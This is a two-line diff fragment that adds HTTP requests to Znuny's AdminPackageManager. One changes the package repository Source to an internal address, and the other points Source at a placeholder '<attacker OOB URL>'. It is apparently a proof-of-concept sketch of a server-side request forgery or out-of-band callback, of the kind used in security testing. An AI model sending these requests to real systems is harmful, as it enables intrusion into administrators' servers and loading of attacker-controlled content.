@@ -1,0 +1,2 @@
+POST /znuny/index.pl  Action=AdminPackageManager;Subaction=ChangeRepository;Source=http://172.18.0.1:39863/repo;ChallengeToken=<admin>
+GET  /znuny/index.pl?Action=AdminPackageManager;Source=<attacker OOB URL>
